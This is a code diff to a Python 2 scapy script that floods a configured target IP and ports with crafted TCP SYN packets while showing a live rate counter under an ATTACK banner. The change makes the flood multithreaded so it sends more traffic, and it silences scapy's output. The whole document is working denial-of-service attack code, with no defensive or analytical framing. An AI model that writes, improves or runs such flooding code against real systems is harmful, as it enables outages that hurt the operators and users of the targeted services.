@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+import threading
 from scapy.layers.inet import IP, TCP, RandShort, ls, send
 from scapy.sendrecv import srloop
 
@@ -14,14 +15,25 @@ ATTACK = (
     '|     Bit/s     '
     '\n{}').format('-' * 63)
 
+npackets = 0
+nbytes = 0
+
 class PacketSenderManager:
     def __init__(self, configFileManager, transportType,event):
         self.configFileHelper = configFileManager
         self.transportType = transportType
-        self.event=event
-        self.npackets=0
-        self.nbytes=0
+        self.threads = configFileManager.synFlood.threads
+        self.event = event
+
+    def stress(self):
+        if self.transportType =='TCP':
+            for i in range(self.threads):
+                t = threading.Thread(target=self.startTCPSender)
+                t.start()
+
     def startTCPSender(self):
+        global npackets
+        global nbytes
         ports = (self.configFileHelper.synFlood.port)
         portList = ports.split(',')
         intPortList = map(int, portList)
@@ -29,13 +41,14 @@ class PacketSenderManager:
         # print portList
         # print intPortList
         ip = IP(dst=self.configFileHelper.synFlood.targetIp, id=1111, ttl=255)
-        tcp = TCP(sport=RandShort(),dport=intPortList,seq=12345, ack=1000,window=1000,flags="S")
+        tcp = TCP(sport=RandShort(),dport=intPortList,seq=0, ack=0,window=64,flags="S")
         data = "SZR_TPRK"
         package = ip / tcp / data
         while self.event.isSet():
-            send(package)
-            self.npackets +=1
-            self.nbytes = self.npackets*len(package)
+            send(package, verbose=False)
+            npackets += 1
+            nbytes = npackets*len(package)
+            #print str(self.npackets) + ' ' + str(self.nbytes)
 
         # p = IP(dst=self.configFileHelper.synFlood.targetIp, id=1111, ttl=255) / TCP(sport=RandShort(),
         #                                                                        dport=intPortList,
@@ -68,22 +81,22 @@ class PacketSenderManager:
         #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
         #     ans.make_table(
         #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
-    def monitorNetwork(self):
-        print ATTACK
-        FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
-        start = time.time()
-        while True:
-            try:
-                current = time.time() - start
-                bps = (self.nbytes * 8) / current
-                pps = self.npackets / current
-                out = FMT.format(Calc(self.npackets, 1000),
-                                 Calc(self.nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
-                sys.stderr.write('\r{}{}'.format(out, ' ' * (60 - len(out))))
-                time.sleep(1)
-            except KeyboardInterrupt:
-                print '\nInterrupted'
-                break
-            except Exception as err:
-                print '\nError:', str(err)
-                break
+def monitorNetwork():
+    print ATTACK
+    FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
+    start = time.time()
+    while True:
+        try:
+            current = time.time() - start
+            bps = (nbytes * 8) / current
+            pps = npackets / current
+            out = FMT.format(Calc(npackets, 1000),
+                              Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
+            sys.stderr.write('\r{}{}'.format(out, ' ' * (60 - len(out))))
+            time.sleep(1)
+        except KeyboardInterrupt:
+            print '\nInterrupted'
+            break
+        except Exception as err:
+            print '\nError:', str(err)
+            break
